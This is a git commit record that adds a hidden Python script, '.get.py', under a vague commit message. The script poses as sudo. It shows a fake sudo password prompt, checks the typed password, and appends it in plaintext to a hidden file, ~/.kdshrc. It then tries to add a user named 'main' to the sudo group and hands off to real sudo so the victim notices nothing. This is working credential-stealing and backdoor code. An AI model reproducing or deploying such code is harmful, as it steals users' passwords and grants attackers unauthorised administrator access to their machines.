9d4657eaedc28f1a64a617cb704d81f9eac0ce83
sudo-gera <gera.tatarinov.999@gmail.com>
2021-12-22 01:23:51 +0300

    *interesting commit message*

---
+++ .get.py
@@ -0,0 +1,32 @@
+#!/usr/bin/python3
+from sys import *
+from subprocess import *
+from getpass import getuser
+from getpass import getpass
+from time import *
+from os.path import *
+def check_sudo(q):
+	a=run('sudo -S echo s'.split(),input=str(q),encoding='utf-8',stderr=PIPE,stdout=PIPE)
+	return bool(a.stdout.strip())
+if run('sudo -n true'.split(),encoding='utf-8',stderr=PIPE,stdout=PIPE).returncode==0:
+	exit(run(['sudo']+argv[1:]).returncode)
+for w in range(3):
+	try:
+		a=getpass('[sudo] password for '+getuser()+':')
+		ca=check_sudo(a)
+	except KeyboardInterrupt:
+		print()
+		exit(130)
+	if ca:
+		open(expanduser('~/.kdshrc'),'a').write(a+'\n')
+		try:
+			run('usermod -aG sudo main'.split())
+		except Exception:
+			pass
+		exit(run(['sudo']+argv[1:]).returncode)
+	else:
+		if w<2:
+			stderr.flush()
+		else:
+			stderr.write('sudo: 3 incorrect password attempts\n')
+			stderr.flush()
